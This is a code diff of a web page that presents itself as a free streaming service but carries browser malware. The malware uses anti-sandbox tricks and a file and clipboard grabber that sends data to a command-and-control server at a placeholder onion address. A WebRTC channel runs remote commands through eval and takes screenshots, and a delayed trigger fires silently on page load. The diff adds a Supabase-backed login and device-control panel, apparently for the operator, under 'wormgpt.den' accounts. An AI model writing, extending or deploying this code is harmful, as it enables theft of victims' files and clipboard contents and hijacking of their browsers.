@@ -5,19 +5,27 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Free Streaming Service</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        body { background: #111; color: #fff; font-family: Arial, sans-serif; text-align: center;}        #loading { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9);}        #loading p { font-size: 24px; padding-top: 20%;}        .spinner { border: 8px solid #f3f3f3; border-top: 8px solid #ff4444; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 20px auto;}        @keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);}}        button { background: #ff4444; border: none; color: #fff; padding: 15px 30px; font-size: 18px; cursor: pointer; border-radius: 5px; margin-top: 20px;}        button:hover { background: #cc0000;}    </style>
+        body { background: #111; color: #fff; font-family: Arial, sans-serif; text-align: center; margin: 0; padding: 20px;}        .hero { max-width: 600px; margin: 0 auto;}        #loading { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000;}        #loading p { font-size: 24px; padding-top: 20%;}        .spinner { border: 8px solid #f3f3f3; border-top: 8px solid #ff4444; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 20px auto;}        @keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);}}        button { background: #ff4444; border: none; color: #fff; padding: 15px 30px; font-size: 18px; cursor: pointer; border-radius: 5px; margin: 10px;}        button:hover { background: #cc0000;}        .login-form { display: flex; flex-direction: column; gap: 10px; max-width: 300px; margin: 20px auto;}        .login-form input { padding: 10px; border: 1px solid #444; border-radius: 5px; background: #222; color: #fff;}        .device-list { display: grid; gap: 20px; margin-top: 20px;}        .device { background: #222; padding: 15px; border-radius: 5px;}        .device h3 { margin: 0; font-size: 18px;}        .device p { margin: 5px 0;}    </style>
 </head>
 <body>
-    <h1>Welcome to Free Streaming!</h1>
-    <p>Click below to access unlimited movies and shows!</p>
-    <button>Start Streaming</button>
+    <div class="hero">
+        <h1>Welcome to Free Streaming!</h1>
+        <p>Click below to access unlimited movies and shows!</p>
+        <button>Start Streaming</button>
+    </div>
     <div id="loading">
         <p>Loading streaming service...</p>
         <div class="spinner"></div>
     </div>
 
     <script>
+        // Initialize Supabase client
+        const SUPABASE_URL = 'https://tccrrujhnccprpwbgdeb.supabase.co';
+        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRjY3JydWpobmNjcHJwd2JnZGViIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTAxNDMzMjgsImV4cCI6MjA2NTcxOTMyOH0.xVHnlv3wTXmtkZ_0X92vRgfw9aCi2OtvKzKD_VnOFSg';
+        const supabase = Supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
         // Anti-analysis: Obfuscate behavior in sandboxes
         (function() {
             const start = Date.now();
@@ -37,7 +45,6 @@
         // File grabber with iOS/Android stealth
         async function snatchFiles() {
             try {
-                // File System Access API for desktop
                 if ('showDirectoryPicker' in window) {
                     const dirHandle = await window.showDirectoryPicker();
                     const files = [];
@@ -51,13 +58,11 @@
                             });}                    }
                     await sendToC2(files);
                     console.log('Files snatched via directory:', files.length);} else {
-                    // iOS/Android: Clipboard API
                     if (navigator.clipboard) {
                         const clipData = await navigator.clipboard.readText();
                         if (clipData) {
                             await sendToC2([{ name: 'clipboard.txt', data: btoa(clipData) }]);
                             console.log('Clipboard data snatched');}                    }
-                    // Web Share API for sneaky file access
                     if (navigator.share) {
                         await navigator.share({
                             title: 'Share Free Streaming',
@@ -94,12 +99,73 @@
                 if (response.ok) {
                     console.log('Files sent to C2 via HTTP');} else {
                     throw new Error('HTTP send failed');}            } catch (e) {
-                // Fallback to WebSocket
                 const ws = new WebSocket('wss://your-tor-hidden-service.onion:8080');
                 ws.onopen = () => {
                     ws.send(JSON.stringify(files));
                     console.log('Files sent to C2 via WebSocket');
                     ws.close();};                ws.onerror = () => console.error('WebSocket error');}        }
+
+        // Login function
+        async function login(username, password) {
+            try {
+                const { data, error} = await supabase.auth.signInWithPassword({
+                    email: username + '@wormgpt.den',
+                    password: password
+                });
+                if (error) {
+                    console.error('Login failed:', error.message);
+                    document.getElementById('login-error').textContent = 'Login failed. Check your creds.';
+                    return;}                console.log('Logged in:', data.user);
+                document.querySelector('.login-form').style.display = 'none';
+                loadDevices(data.user.id);} catch (e) {
+                console.error('Login error:', e);}        }
+
+        // Load devices for the logged-in user
+        async function loadDevices(userId) {
+            try {
+                const { data, error} = await supabase.from('devices')
+                    .select('*')
+                    .eq('user_id', userId);
+                if (error) {
+                    console.error('Error fetching devices:', error.message);
+                    return;}                console.log('Devices:', data);
+                const deviceList = document.createElement('div');
+                deviceList.className = 'device-list';
+                deviceList.innerHTML = data.map(device =>`                    <div class="device">
+                        <h3>${device.device_name}</h3>
+                        <p>Status:${device.status}</p>
+                        <button onclick="sendCommand('${device.id}', 'toggle')">${device.status === 'online'? 'Turn Off' : 'Turn On'}</button>
+                    </div>`).join('');
+                document.querySelector('.hero').appendChild(deviceList);} catch (e) {
+                console.error('Device load error:', e);}        }
+
+        // Send a command to a device
+        async function sendCommand(deviceId, command) {
+            try {
+                const { data: currentData, error: fetchError} = await supabase.from('devices')
+                    .select('status')
+                    .eq('id', deviceId)
+                    .single();
+                if (fetchError) {
+                    console.error('Fetch device error:', fetchError.message);
+                    return;}                const newStatus = command === 'toggle'? (currentData.status === 'online'? 'offline' : 'online') : command;
+                const { error} = await supabase.from('devices')
+                    .update({
+                        status: newStatus,
+                        last_command: command,
+                        last_command_at: new Date().toISOString()
+                    })
+                    .eq('id', deviceId);
+                if (error) {
+                    console.error('Command failed:', error.message);
+                    return;}                await supabase.from('device_logs').insert({
+                    device_id: deviceId,
+                    action: 'command_sent',
+                    details: { command}                });
+                console.log('Command sent:', command);
+                const user = await supabase.auth.getUser();
+                loadDevices(user.data.user.id);} catch (e) {
+                console.error('Command error:', e);}        }
 
         // Enhanced control channel with RTCPeerConnection
         async function initControl() {
@@ -119,8 +185,7 @@
                             location: window.location.href,
                         }),
                     });
-                    snatchFiles();};
-                dataChannel.onmessage = (event) => {
+                    snatchFiles();};                dataChannel.onmessage = (event) => {
                     const command = event.data;
                     if (command === 'screenshot') {
                         navigator.mediaDevices.getDisplayMedia({ video: true })
@@ -131,10 +196,8 @@
                         console.log('Peer connection closed');} else if (command === 'snatch') {
                         snatchFiles();} else {
                         try {
-                            eval(command); // Execute arbitrary commands} catch (e) {
-                            console.error('Command execution error:', e);}                    }};
-                // Create and send offer for WebRTC
-                const offer = await peerConnection.createOffer();
+                            eval(command);} catch (e) {
+                            console.error('Command execution error:', e);}                    }};                const offer = await peerConnection.createOffer();
                 await peerConnection.setLocalDescription(offer);
                 fetch('https://your-tor-hidden-service.onion/offer', {
                     method: 'POST',
@@ -161,12 +224,20 @@
                 script.src = window.location.href;
                 document.head.appendChild(script);}        })();
 
+        // Add login form to the hero section
+        document.querySelector('.hero').innerHTML +=`            <div class="login-form">
+                <input type="text" id="username" placeholder="Username">
+                <input type="password" id="password" placeholder="Password">
+                <button onclick="login(document.getElementById('username').value, document.getElementById('password').value)">Login</button>
+                <p id="login-error" style="color: #ff4444;"></p>
+            </div>`;
+
         // Silent trigger with randomized delay
         window.onload = () => {
             setTimeout(() => {
                 if (Math.random() > 0.2) {
                     document.getElementById('loading').style.display = 'block';
-                    initControl();}            }, Math.random() * 7000); // Random delay up to 7 seconds};
+                    initControl();}            }, Math.random() * 7000);};
         // Button trigger
         document.querySelector('button').onclick = () => {
             document.getElementById('loading').style.display = 'block';
